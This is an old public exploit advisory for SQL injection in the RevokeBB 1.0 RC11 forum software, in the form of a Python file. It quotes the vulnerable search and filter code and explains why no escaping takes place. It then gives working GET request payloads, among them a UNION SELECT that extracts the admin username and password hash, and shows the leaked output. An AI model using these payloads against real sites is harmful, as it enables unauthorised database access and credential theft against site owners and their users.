#!/usr/bin/python
"""
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This is a public Exploit                                    #
#=================================================================================================#
#  	           		         RevokeBB 1.0 RC11                                        #
#                                    Sql Injection Vulnerability                                  #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
#                   			         #  Vendor:   sourceforge.net/projects/revokebb/  #
#                                                #  Author:   The:Paradox                         #
#		   Nothing!			 #  Severity: Critical		                  #
#                                                #                                                #
#       					 #  Proud To Be Italian.                          #
#                                                #                                                #
#====================================#===========#================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
# RevokeBB presents a critical vulnerability in the "Search System". Let's see sources:  	  #
#=================================================================================================#

[./inc/acts/search.module.php]

85.  $search_string = $this->var_filtrer->String('search');

141. $search->fast_thread_search($search_string, $start, 15);

[./inc/class_search.php]

83.	function fast_thread_search($string, $start, $stop)
84.		{
85.		if($start > '0')
86.			$str = ($start - 1)*$stop;
87.		else
88.			$str = 0;
89.
90.			//$string = $this->prepare_sstring($string);
91.
92.
93.			$query = $this->db->execQuery($this->prepare_query('revokebb_posts.text', $string, 0, array($str, $stop) ));

#=================================================================================================#
# Ok, we have a sql query with $search_string. Seems it has been cleaned by var_filtrer(),        #
# but don't trust function names =D. Let's have a look?                                           #
#=================================================================================================#

[./inc/class_var_filtrer]

41.	function var_filtrer()
42.	{
43.		//$this->add($var);
44.
45.	}

#=================================================================================================#
# What? An empty function??? This function does really nothing :D ... But that's not all.	  #
# Let's see String() function.  								  #
#=================================================================================================#

[./inc/class_var_filtrer]

74.	function String($name, $let_html=1)
75.	{
76.		if(!isset($this->variable[$name]))
77.			return '';
78.
79.		$this->variable[$name]=stripslashes(trim($this->variable[$name]));
80.
81.		if($let_html!=1)
82.			$this->variable[$name]=strip_tags($this->variable[$name]);
83.
84.		/*$this->variable[$name]=htmlspecialchars($this->variable[$name], ENT_QUOTES);*/
85.
86.		$this->variable[$name]=htmlentities($this->variable[$name]);
87.
88.      $this->variable[$name] = preg_replace("/\\\(?!&#|\?#)/", "&#092;", $this->variable[$name]);
89.
90.      return trim($this->variable[$name]);
91.	}

#=================================================================================================#
# See, $name is stripslashed :D That's all, Sql injection vulnerability Magic Quotes Indipendent. #
# Let's have a try.  										  #
#=================================================================================================#

GET http://localhost/RevokeBB/?search=%25%27pwnz00red

Fatal error: database::query() Could not execute: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version for the right syntax to use
near 'pwnz00red%' GROUP BY revokebb_threads.thread_id LIMIT 0,15' at line 7

GET http://localhost/RevokeBB/?search=|The:Paradox|%25%27/**/union/**/select/**/1,2,3,4,5,6,concat(user_nick,0x3a,user_password),8,9,10,11,12,13,14,15,16,17,18/**/from/**/revokebb_users/**/where/**/user_id=1/*

Title  	Author  				Replies  	Visits  	Last post
  2    	root:42f3f2bd1a74120fb585a894aa13b31a 	10 		13 		01-01-1970 00:00:09
										4
#=================================================================================================#
# Use these informations at your own risk. You are responsible for your own deeds.                #
#=================================================================================================#
"""

# milw0rm.com [2008-05-27]